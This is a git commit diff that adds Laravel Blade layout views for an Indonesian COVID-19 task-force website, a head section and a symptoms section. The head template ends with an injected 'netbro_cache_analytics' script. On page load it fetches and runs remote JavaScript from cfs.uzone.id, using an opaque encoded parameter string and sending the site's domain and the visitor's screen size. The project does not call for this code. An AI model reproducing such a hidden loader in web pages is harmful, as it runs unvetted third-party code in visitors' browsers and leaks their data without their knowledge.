423b54f65ccdb9c952f0005a011a698a594bfa85
Muhammad Surya Maulana <battletank19@gmail.com>
2020-03-27 23:10:55 +0700

    layout

---
+++ resources/views/layout/css.blade.php
@@ -0,0 +1,79 @@
+<head>
+    <meta charset="utf-8">
+    
+    <!--====== Title ======-->
+    <title>SATGAS SIAGA COVID-19</title>
+    
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--====== Favicon Icon ======-->
+    <link rel="shortcut icon" href="assets/images/favicon.png" type="image/png">
+        
+    <!--====== Animate CSS ======-->
+    <link rel="stylesheet" href="assets/css/animate.css">
+        
+    <!--====== Magnific Popup CSS ======-->
+    <link rel="stylesheet" href="assets/css/magnific-popup.css">
+        
+    <!--====== Slick CSS ======-->
+    <link rel="stylesheet" href="assets/css/slick.css">
+        
+    <!--====== Line Icons CSS ======-->
+    <link rel="stylesheet" href="assets/css/LineIcons.css">
+        
+    <!--====== Font Awesome CSS ======-->
+    <link rel="stylesheet" href="assets/css/font-awesome.min.css">
+        
+    <!--====== Bootstrap CSS ======-->
+    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+    
+    <!--====== Default CSS ======-->
+    <link rel="stylesheet" href="assets/css/default.css">
+    
+    <!--====== Style CSS ======-->
+    <link rel="stylesheet" href="assets/css/style.css">
+    
+    <link rel="stylesheet" href="css/leaflet.css">
+    <link rel="stylesheet" href="css/qgis2web.css"><link rel="stylesheet" href="css/fontawesome-all.min.css">
+
+    <!--====== Jquery js ======-->
+    <script src="assets/js/vendor/jquery-1.12.4.min.js"></script>
+    <script src="assets/js/vendor/modernizr-3.7.1.min.js"></script>
+    
+    <!--====== Bootstrap js ======-->
+    <script src="assets/js/popper.min.js"></script>
+    <script src="assets/js/bootstrap.min.js"></script>
+    
+    <!--====== Plugins js ======-->
+    <script src="assets/js/plugins.js"></script>
+    
+    <!--====== Slick js ======-->
+    <script src="assets/js/slick.min.js"></script>
+    
+    <!--====== Ajax Contact js ======-->
+    <script src="assets/js/ajax-contact.js"></script>
+    
+    <!--====== Counter Up js ======-->
+    <script src="assets/js/waypoints.min.js"></script>
+    <script src="assets/js/jquery.counterup.min.js"></script>
+    
+    <!--====== Magnific Popup js ======-->
+    <script src="assets/js/jquery.magnific-popup.min.js"></script>
+    
+    <!--====== Scrolling Nav js ======-->
+    <script src="assets/js/jquery.easing.min.js"></script>
+    <script src="assets/js/scrolling-nav.js"></script>
+    
+    <!--====== wow js ======-->
+    <script src="assets/js/wow.min.js"></script>
+    
+    <!--====== Particles js ======-->
+    <script src="assets/js/particles.min.js"></script>
+    
+    <!--====== Main js ======-->
+    <script src="assets/js/main.js"></script>
+    
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXRrbn9UnDO7%2blHt9Iim%2bEIVumAF9gri%2ftydC7PDqzHPi9iZBCvbrze5rkjJWfJVtEHlBSz0ceHurILgHUcQF64aKIWc9EKzMJUvVjUrb6AxqcW8vQ2G%2fRbqg6yPQaTGVBW3%2bVJBEtES3dZmg3hSU4Bmk5Ue5iEz0Y9txAZ99SfNMRchZdOl1QnEoYe1B8gtnnd%2fcun6X%2fsnZDflSvnvKm5HftsbP562qXLz%2bYm71HMC9W6h9Nz%2fPHseWvdO6SdtR8LNvEp1l6zBDzaabrtKVqZCT9f0WZh7lpUDx0R6Qlq84EGl1IGt22vEFEUmOgwRU6GK98YCMKCDpK24CF1ZAJbRThpeIFv5vStXUWL3TesZpeW7bMVhVd8Lflp22GVSfqNJZW4AIigjCKcwo4AJr46%2fTlS%2bTWcR%2f7WIoAHPmgyXCuOmSfxmkMAPtdSDSmomgk9ZYd5sGWggObC%2f2SYH1hT9TVVM2qepYu2bDyxkivF%2bw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+</head>
---
+++ resources/views/layout/gejala.blade.php
@@ -0,0 +1,98 @@
+    <section id="features" class="services-area pt-120">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-lg-10">
+                    <div class="section-title text-center pb-40">
+                        <div class="line m-auto"></div>
+                        <h3 class="title">Tanda dan Gejala, <span> Covid-19</span></h3>
+                    </div> <!-- section title -->
+                </div>
+            </div> <!-- row -->
+            <div class="row justify-content-center">
+                <div class="col-lg-4 col-md-7 col-sm-8">
+                    <div class="single-services text-center mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.2s">
+                        <div class="services-icon">
+                            <img class="shape" src="assets/images/demam.png" alt="shape">
+                            <img class="shape-1" src="assets/images/demam.png" alt="shape">
+                            
+                        </div>
+                        <div class="services-content mt-30">
+                            <h4 class="services-title"><a href="#">Demam Tinggi</a></h4>
+                            <p class="text">Demam menunjukkan gejala awal corona, demam biasanya mencapai suhu 38 derajat celcius keatas</p>
+                            <!-- <a class="more" href="#">Learn More <i class="lni-chevron-right"></i></a> -->
+                        </div>
+                    </div> <!-- single services -->
+                </div>
+                <div class="col-lg-4 col-md-7 col-sm-8">
+                    <div class="single-services text-center mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.5s">
+                        <div class="services-icon">
+                            <img class="shape" src="assets/images/batuk%20kering.png" alt="shape">
+                            <img class="shape-1" src="assets/images/batuk%20kering.png" alt="shape">
+                            
+                        </div>
+                        <div class="services-content mt-30">
+                            <h4 class="services-title"><a href="#">Batuk Kering</a></h4>
+                            <p class="text">Batuk Kering tidak beriak dan berulang ulang merupakan tanda infeksi aktif di paru-paru, yang mungkin bisa disebabkan karena COVID-19.</p>
+                            <!-- <a class="more" href="#">Learn More <i class="lni-chevron-right"></i></a> -->
+                        </div>
+                    </div> <!-- single services -->
+                </div>
+                <div class="col-lg-4 col-md-7 col-sm-8">
+                    <div class="single-services text-center mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.8s">
+                        <div class="services-icon">
+                            <img class="shape" src="assets/images/sakit%20tenggorokan.png" alt="shape">
+                            <img class="shape-1" src="assets/images/sakit%20tenggorokan.png" alt="shape">
+                            
+                        </div>
+                        <div class="services-content mt-30">
+                            <h4 class="services-title"><a href="#">Sakit Tenggorokan</a></h4>
+                            <p class="text">Infeksi COVID-19 akan melalui jalur pernafasan sehingga dapat mengakibatkan radang pada tenggorokan dan rasa nyeri.</p>
+                            <!-- <a class="more" href="#">Learn More <i class="lni-chevron-right"></i></a> -->
+                        </div>
+                    </div> <!-- single services -->
+                </div>
+                <div class="col-lg-4 col-md-7 col-sm-8">
+                    <div class="single-services text-center mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.8s">
+                        <div class="services-icon">
+                            <img class="shape" src="assets/images/sakit%20kepala.png" alt="shape">
+                            <img class="shape-1" src="assets/images/sakit%20kepala.png" alt="shape">
+                            
+                        </div>
+                        <div class="services-content mt-30">
+                            <h4 class="services-title"><a href="#">Sakit Kepala</a></h4>
+                            <p class="text">Dengan adanya demam yang tinggi, COVID-19 seringkali diikuti dengan gejala sakit kepala.</p>
+                            <!-- <a class="more" href="#">Learn More <i class="lni-chevron-right"></i></a> -->
+                        </div>
+                    </div> <!-- single services -->
+                </div>
+                <div class="col-lg-4 col-md-7 col-sm-8">
+                    <div class="single-services text-center mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.8s">
+                        <div class="services-icon">
+                            <img class="shape" src="assets/images/lemas.png" alt="shape">
+                            <img class="shape-1" src="assets/images/lemas.png" alt="shape">
+                            
+                        </div>
+                        <div class="services-content mt-30">
+                            <h4 class="services-title"><a href="#">Lemas</a></h4>
+                            <p class="text">Infeksi COVID-19 yang telah menyebar ke seluruh tubuh akan menghabiskan energi yang banyak sehingga seringkali dapat mengakibatkan lemas.</p>
+                            <!-- <a class="more" href="#">Learn More <i class="lni-chevron-right"></i></a> -->
+                        </div>
+                    </div> <!-- single services -->
+                </div>
+                <div class="col-lg-4 col-md-7 col-sm-8">
+                    <div class="single-services text-center mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.8s">
+                        <div class="services-icon">
+                            <img class="shape" src="assets/images/sesak%20nafas.png" alt="shape">
+                            <img class="shape-1" src="assets/images/sesak%20nafas.png" alt="shape">
+                            
+                        </div>
+                        <div class="services-content mt-30">
+                            <h4 class="services-title"><a href="#">Sesak Nafas</a></h4>
+                            <p class="text">Apabila COVID-19 berkembang dengan cepat dan besar di paru-paru, fungsi paru akan menurun sehingga terjadi sesak nafas.</p>
+                            <!-- <a class="more" href="#">Learn More <i class="lni-chevron-right"></i></a> -->
+                        </div>
+                    </div> <!-- single services -->
+                </div>
+            </div> <!-- row -->
+        </div> <!-- container -->
+    </section>
